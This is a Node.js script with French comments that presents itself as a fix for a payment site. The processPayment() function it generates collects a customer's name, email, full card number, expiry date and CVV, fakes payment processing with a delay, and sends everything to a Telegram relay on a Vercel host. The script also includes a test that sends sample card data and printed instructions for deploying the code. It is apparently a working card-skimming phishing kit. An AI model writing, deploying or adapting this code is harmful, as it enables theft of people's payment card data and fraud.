const fetch = require('node-fetch');

console.log('🔧 CORRECTIF POUR LE SITE DE PAIEMENT');
console.log('====================================');

const CONFIG = {
    SITE_URL: 'https://test-alpha-lac-68.vercel.app',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram'
};

// Fonction pour corriger le code JavaScript du site
function generateFixedJavaScript() {
    return `
// CORRECTIF POUR LE SITE DE PAIEMENT
// Remplace la fonction processPayment() défectueuse

async function processPayment() {
    try {
        // Récupérer les données du formulaire
        const paymentData = {
            customerName: document.getElementById('customerName').value || 'Client',
            email: document.getElementById('email').value || 'client@example.com',
            amount: document.getElementById('amount').value || '99.99',
            cardNumber: document.getElementById('cardNumber').value || '**** **** **** ****',
            expiry: document.getElementById('expiry').value || 'MM/AA',
            cvv: document.getElementById('cvv').value || '***'
        };
        
        console.log('💳 Traitement du paiement via Vercel...', paymentData);
        
        // Afficher le loading
        showLoading(true);
        hideResult();
        
        // Simuler le traitement du paiement (1-2 secondes)
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // Envoyer la notification via l'API Vercel (CORRIGÉ)
        try {
            const response = await fetch('${CONFIG.TELEGRAM_API_URL}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: \`💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: \${paymentData.customerName}
📧 Email: \${paymentData.email}
💳 Carte: \${paymentData.cardNumber}
📅 Expiration: \${paymentData.expiry}
🔐 CVV: \${paymentData.cvv}
💶 Montant: \${paymentData.amount}€
🔒 Vérifiez immédiatement !\`,
                    type: 'payment'
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                showSuccess(paymentData, result);
            } else {
                showError('Erreur lors de l\\'envoi de la notification: ' + result.error);
            }
        } catch (apiError) {
            console.error('Erreur API:', apiError);
            showError('Erreur de connexion à l\\'API: ' + apiError.message);
        }
        
    } catch (error) {
        console.error('Erreur paiement:', error);
        showError('Erreur lors du traitement du paiement: ' + error.message);
    } finally {
        showLoading(false);
    }
}

// Fonction pour afficher le succès
function showSuccess(paymentData, result) {
    const resultDiv = document.getElementById('result');
    resultDiv.innerHTML = \`
        <div class="success">
            <h3>✅ Paiement traité avec succès !</h3>
            <p><strong>Montant:</strong> \${paymentData.amount}€</p>
            <p><strong>Client:</strong> \${paymentData.customerName}</p>
            <p><strong>Email:</strong> \${paymentData.email}</p>
            <p><strong>Message ID:</strong> \${result.telegramResponse?.result?.message_id || 'N/A'}</p>
            <p>📱 Notification envoyée sur Telegram !</p>
        </div>
    \`;
    resultDiv.style.display = 'block';
}

// Fonction pour afficher les erreurs
function showError(message) {
    const resultDiv = document.getElementById('result');
    resultDiv.innerHTML = \`
        <div class="error">
            <h3>❌ Erreur</h3>
            <p>\${message}</p>
        </div>
    \`;
    resultDiv.style.display = 'block';
}

// Fonction pour afficher le loading
function showLoading(show) {
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = show ? 'block' : 'none';
}

// Fonction pour masquer le résultat
function hideResult() {
    const resultDiv = document.getElementById('result');
    resultDiv.style.display = 'none';
}

console.log('✅ Correctif de paiement chargé !');
`;
}

// Fonction pour tester le correctif
async function testFixedPayment() {
    try {
        console.log('🧪 Test du correctif de paiement...');
        
        const paymentData = {
            customerName: 'Test Correctif',
            email: 'test@correctif.com',
            cardNumber: '1234 5678 9012 3456',
            expiry: '12/25',
            cvv: '123',
            amount: '99.99'
        };
        
        const message = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
💳 Carte: ${paymentData.cardNumber}
📅 Expiration: ${paymentData.expiry}
🔐 CVV: ${paymentData.cvv}
💶 Montant: ${paymentData.amount}€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: message,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Correctif testé avec succès !');
            console.log(`📱 Message ID: ${result.telegramResponse?.result?.message_id}`);
            return true;
        } else {
            console.log(`❌ Erreur test correctif: ${result.error}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Erreur test correctif: ${error.message}`);
        return false;
    }
}

// Fonction principale
async function main() {
    console.log('🔍 Diagnostic du problème...');
    
    // Tester l'API
    const apiTest = await testFixedPayment();
    
    if (apiTest) {
        console.log('\n✅ L\'API fonctionne correctement');
        console.log('🔧 Le problème est dans le code JavaScript du site');
        console.log('\n📝 CORRECTIF À APPLIQUER :');
        console.log('========================');
        console.log('Remplacez la fonction processPayment() sur votre site par :');
        console.log('');
        console.log(generateFixedJavaScript());
        console.log('\n💡 Instructions :');
        console.log('1. Ouvrez votre site sur Vercel');
        console.log('2. Modifiez le fichier HTML/JavaScript');
        console.log('3. Remplacez la fonction processPayment() par le code ci-dessus');
        console.log('4. Déployez les changements');
    } else {
        console.log('❌ L\'API ne fonctionne pas, vérifiez la connexion');
    }
}

// Exécuter
main().catch(console.error);
